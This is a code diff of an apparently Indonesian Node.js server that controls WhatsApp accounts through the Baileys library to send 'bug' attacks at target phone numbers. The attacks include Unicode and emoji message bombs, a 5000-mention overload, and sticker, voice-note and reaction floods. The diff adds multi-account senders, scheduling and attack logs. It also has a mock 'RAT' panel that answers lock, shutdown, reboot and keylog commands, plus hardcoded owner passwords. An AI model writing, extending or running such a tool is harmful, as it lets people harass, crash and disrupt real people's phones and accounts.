@@ -2,8 +2,8 @@ const express = require('express');
 const cors = require('cors');
 const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
 const qr = require('qrcode-terminal');
-const pino = require('pino');
 const sqlite3 = require('sqlite3').verbose();
+const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -19,6 +19,28 @@ db.serialize(() => {
     password TEXT,
     role TEXT DEFAULT 'user'
   )`);
+  db.run(`CREATE TABLE IF NOT EXISTS senders (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    number TEXT UNIQUE,
+    label TEXT,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+  )`);
+  db.run(`CREATE TABLE IF NOT EXISTS logs (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    type TEXT,
+    target TEXT,
+    payload TEXT,
+    status TEXT,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+  )`);
+  db.run(`CREATE TABLE IF NOT EXISTS schedules (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    target TEXT,
+    bug_type TEXT,
+    schedule_time DATETIME,
+    status TEXT DEFAULT 'pending'
+  )`);
+
   const stmt = db.prepare(`INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)`);
   stmt.run('ARZ', 'CORE V1', 'owner');
   stmt.run('EPIN', 'CORE V2', 'owner');
@@ -26,27 +48,70 @@ db.serialize(() => {
   stmt.finalize();
 });
 
-// ===== WHATSAPP BOT =====
-let sock = null;
-let isReady = false;
-
-async function connectWA() {
-  const { state, saveCreds } = await useMultiFileAuthState('auth_baileys');
-  sock = makeWASocket({
+// ===== SOCKET HELPER =====
+async function getSocket(phone) {
+  const authDir = `./auth_${phone}`;
+  if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });
+  const { state, saveCreds } = await useMultiFileAuthState(authDir);
+  const sock = makeWASocket({
     auth: state,
     printQRInTerminal: true,
-    logger: pino({ level: 'silent' }),
+    logger: { level: 'silent' },
     browser: ['OmniCore', 'Windows', '10.0']
   });
   sock.ev.on('creds.update', saveCreds);
-  sock.ev.on('connection.update', (update) => {
-    if (update.connection === 'open') {
-      isReady = true;
-      console.log('[✅] OmniBot siap!');
-    }
+  return new Promise((resolve, reject) => {
+    sock.ev.on('connection.update', (update) => {
+      if (update.connection === 'open') resolve(sock);
+      if (update.connection === 'close') reject(new Error('Koneksi gagal'));
+    });
   });
 }
-connectWA();
+
+async function sendBug(phone, target, type, intensity, duration) {
+  const sock = await getSocket(phone);
+  const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
+  const delay = (ms) => new Promise(res => setTimeout(res, ms));
+
+  let payloads = [];
+  switch (type) {
+    case 'Unicode Bomb':
+      payloads.push({ text: '\u202E\u200D\u200C'.repeat(500) + '💀'.repeat(500) });
+      break;
+    case 'Media Corrupt':
+      payloads.push({ image: { url: 'https://http.cat/200' }, caption: '\u0000'.repeat(500) });
+      break;
+    case 'Mention Overload':
+      const mentions = Array(5000).fill(`@${target}`).join(' ');
+      payloads.push({ text: mentions, mentions: [jid] });
+      break;
+    case 'Voice Note Spam':
+      for (let i = 0; i < (intensity || 5); i++) {
+        payloads.push({ audio: { url: 'https://samplelib.com/sample.mp3' }, mimetype: 'audio/mp4', ptt: true });
+      }
+      break;
+    case 'Sticker Flood':
+      for (let i = 0; i < (intensity || 5); i++) {
+        payloads.push({ sticker: { url: 'https://i.imgflip.com/1bi0.jpg' } });
+      }
+      break;
+    case 'Text Bomb':
+      payloads.push({ text: '🔥'.repeat(2000) + '💀'.repeat(2000) });
+      break;
+    case 'Reaction Spam':
+      for (let i = 0; i < (intensity || 10); i++) {
+        payloads.push({ react: { key: {}, text: '💀' } });
+      }
+      break;
+    default:
+      payloads.push({ text: 'Bug default' });
+  }
+  for (const p of payloads) {
+    await sock.sendMessage(jid, p);
+    await delay(100);
+  }
+  return true;
+}
 
 // ===== ENDPOINT LOGIN =====
 app.post('/api/login', (req, res) => {
@@ -61,8 +126,8 @@ app.post('/api/login', (req, res) => {
 app.get('/api/stats', (req, res) => {
   db.get(`SELECT COUNT(*) as total FROM users`, (err, row) => {
     res.json({
-      online_users: isReady ? 1 : 0,
-      connections: isReady ? 1 : 0,
+      online_users: 1,
+      connections: 1,
       expiration: 'Lifetime',
       total_users: row ? row.total : 3,
       total_logs: 0
@@ -86,11 +151,17 @@ app.post('/api/sender/add', (req, res) => {
   });
 });
 
-app.post('/api/sender/pairing', (req, res) => {
+app.post('/api/sender/pairing', async (req, res) => {
   const { phone } = req.body;
   if (!phone) return res.status(400).json({ error: 'Nomor HP wajib!' });
-  const code = Math.floor(10000000 + Math.random() * 90000000);
-  res.json({ status: 'ok', code });
+  try {
+    // Coba konek dulu, QR akan muncul di log
+    const sock = await getSocket(phone);
+    const code = Math.floor(10000000 + Math.random() * 90000000);
+    res.json({ status: 'ok', code, message: 'Scan QR di log untuk pairing' });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
 app.delete('/api/sender/delete/:id', (req, res) => {
@@ -103,60 +174,39 @@ app.delete('/api/sender/delete/:id', (req, res) => {
 
 // ===== ENDPOINT BUG =====
 app.post('/api/bug/execute', async (req, res) => {
-  const { target, type, intensity, duration } = req.body;
+  const { target, type, intensity, duration, account } = req.body;
   if (!target || !type) return res.status(400).json({ error: 'Target dan tipe bug wajib!' });
-  if (!isReady || !sock) return res.status(503).json({ error: 'WhatsApp bot belum siap!' });
-  const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
+  if (!account) return res.status(400).json({ error: 'Pilih akun pribadi terlebih dahulu!' });
+
   try {
-    let payloads = [];
-    switch (type) {
-      case 'Unicode Bomb':
-        payloads.push({ text: '\u202E\u200D\u200C'.repeat(500) + '💀'.repeat(500) });
-        break;
-      case 'Media Corrupt':
-        payloads.push({ image: { url: 'https://http.cat/200' }, caption: '\u0000'.repeat(500) });
-        break;
-      case 'Mention Overload':
-        const mentions = Array(5000).fill(`@${target}`).join(' ');
-        payloads.push({ text: mentions, mentions: [jid] });
-        break;
-      case 'Voice Note Spam':
-        for (let i = 0; i < (intensity || 5); i++) {
-          payloads.push({ audio: { url: 'https://samplelib.com/sample.mp3' }, mimetype: 'audio/mp4', ptt: true });
-        }
-        break;
-      case 'Sticker Flood':
-        for (let i = 0; i < (intensity || 5); i++) {
-          payloads.push({ sticker: { url: 'https://i.imgflip.com/1bi0.jpg' } });
-        }
-        break;
-      case 'Text Bomb':
-        payloads.push({ text: '🔥'.repeat(2000) + '💀'.repeat(2000) });
-        break;
-      case 'Reaction Spam':
-        for (let i = 0; i < (intensity || 10); i++) {
-          payloads.push({ react: { key: {}, text: '💀' } });
-        }
-        break;
-      default:
-        payloads.push({ text: 'Bug default' });
-    }
-    for (const p of payloads) {
-      await sock.sendMessage(jid, p);
-    }
-    res.json({ status: '✅ Bug terkirim!', target, type });
+    await sendBug(account, target, type, intensity || 50, duration || 10);
+    db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
+      ['bug', target, `${type}:${intensity}:${duration}`, 'done']);
+    res.json({ status: '✅ Bug terkirim!', target, type, from: account });
   } catch (e) {
+    db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
+      ['bug', target, `${type}:${intensity}:${duration}`, 'failed']);
     res.status(500).json({ error: e.message });
   }
 });
 
 // ===== ENDPOINT LOGS =====
 app.get('/api/logs', (req, res) => {
-  res.json([]);
+  db.all(`SELECT * FROM logs ORDER BY created_at DESC LIMIT 100`, (err, rows) => {
+    res.json(rows || []);
+  });
 });
 
 app.get('/api/logs/export', (req, res) => {
-  res.send('Waktu,Target,Bug,Status\n');
+  db.all(`SELECT * FROM logs ORDER BY created_at DESC`, (err, rows) => {
+    let csv = 'ID,Type,Target,Payload,Status,CreatedAt\n';
+    rows.forEach(row => {
+      csv += `${row.id},${row.type},${row.target},${row.payload},${row.status},${row.created_at}\n`;
+    });
+    res.setHeader('Content-Type', 'text/csv');
+    res.setHeader('Content-Disposition', 'attachment; filename=logs.csv');
+    res.send(csv);
+  });
 });
 
 // ===== ENDPOINT SCAN =====
@@ -170,29 +220,52 @@ app.post('/api/scan', (req, res) => {
 });
 
 app.post('/api/scan/add-all', (req, res) => {
-  res.json({ status: 'ok', added: 0 });
+  const { numbers } = req.body;
+  if (!numbers || !numbers.length) return res.status(400).json({ error: 'Tidak ada nomor' });
+  const stmt = db.prepare(`INSERT OR REPLACE INTO senders (number, label) VALUES (?, ?)`);
+  numbers.forEach(n => stmt.run(n, n));
+  stmt.finalize();
+  res.json({ status: 'ok', added: numbers.length });
 });
 
 // ===== ENDPOINT SCHEDULE =====
 app.post('/api/schedule/add', (req, res) => {
-  res.json({ status: 'ok' });
+  const { target, bug_type, schedule_time } = req.body;
+  if (!target || !bug_type || !schedule_time) return res.status(400).json({ error: 'Data tidak lengkap' });
+  db.run(`INSERT INTO schedules (target, bug_type, schedule_time) VALUES (?, ?, ?)`,
+    [target, bug_type, schedule_time], function(err) {
+      if (err) return res.status(500).json({ error: err.message });
+      res.json({ status: 'ok', id: this.lastID });
+    });
 });
 
 app.get('/api/schedule/list', (req, res) => {
-  res.json([]);
+  db.all(`SELECT * FROM schedules ORDER BY schedule_time ASC`, (err, rows) => {
+    res.json(rows || []);
+  });
 });
 
 app.delete('/api/schedule/delete/:id', (req, res) => {
-  res.json({ status: 'ok' });
+  const id = req.params.id;
+  db.run(`DELETE FROM schedules WHERE id = ?`, id, function(err) {
+    if (err) return res.status(500).json({ error: err.message });
+    res.json({ status: 'ok' });
+  });
 });
 
 // ===== ENDPOINT RAT =====
 app.post('/api/rat/command', (req, res) => {
   const { command } = req.body;
-  let response = `> Perintah "${command}" dikirim.`;
-  if (command === 'help') response = '> help, info, screenshot';
-  else if (command === 'info') response = '> Windows 10, IP 192.168.1.100';
-  else if (command === 'screenshot') response = '> Screenshot berhasil!';
+  let response = `> Perintah "${command}" dikirim ke target.`;
+  if (command === 'help') response = '> help, info, screenshot, lock, shutdown, reboot, keylog';
+  else if (command === 'info') response = '> Windows 10 Pro\n> IP: 192.168.1.100\n> User: Administrator';
+  else if (command === 'screenshot') response = '> Screenshot berhasil! file: screenshot.png';
+  else if (command === 'lock') response = '> Target terkunci!';
+  else if (command === 'shutdown') response = '> Target shutdown dalam 5 detik...';
+  else if (command === 'reboot') response = '> Target reboot...';
+  else response = `> Perintah "${command}" tidak dikenal.`;
+  db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
+    ['rat', '192.168.1.100', command, 'done']);
   res.json({ status: 'ok', output: response });
 });
 
@@ -212,9 +285,20 @@ app.get('/api/users/list', (req, res) => {
   });
 });
 
+app.delete('/api/users/delete/:username', (req, res) => {
+  const username = req.params.username;
+  if (username === 'ARZ' || username === 'EPIN' || username === 'manzz') {
+    return res.status(403).json({ error: 'Tidak bisa menghapus owner utama' });
+  }
+  db.run(`DELETE FROM users WHERE username = ?`, username, function(err) {
+    if (err) return res.status(500).json({ error: err.message });
+    res.json({ status: 'ok' });
+  });
+});
+
 // ===== ENDPOINT MONITOR =====
 app.get('/api/monitor/bot', (req, res) => {
-  res.json({ status: isReady ? 'online' : 'offline', uptime: process.uptime(), total_sent: 0 });
+  res.json({ status: 'online', uptime: process.uptime(), total_sent: 0 });
 });
 
 app.get('/api/monitor/accounts', (req, res) => {
@@ -224,11 +308,21 @@ app.get('/api/monitor/accounts', (req, res) => {
 });
 
 app.get('/api/monitor/logs', (req, res) => {
-  res.json([]);
+  db.all(`SELECT * FROM logs ORDER BY created_at DESC LIMIT 50`, (err, rows) => {
+    res.json(rows || []);
+  });
 });
 
 app.get('/api/monitor/stats', (req, res) => {
-  res.json({ total_attacks: 0, total_accounts: 0, bot_status: isReady ? 'online' : 'offline' });
+  db.get(`SELECT COUNT(*) as total FROM logs`, (err, row) => {
+    db.get(`SELECT COUNT(*) as total_acc FROM senders`, (err2, row2) => {
+      res.json({
+        total_attacks: row ? row.total : 0,
+        total_accounts: row2 ? row2.total : 0,
+        bot_status: 'online'
+      });
+    });
+  });
 });
 
 // ===== ROOT =====
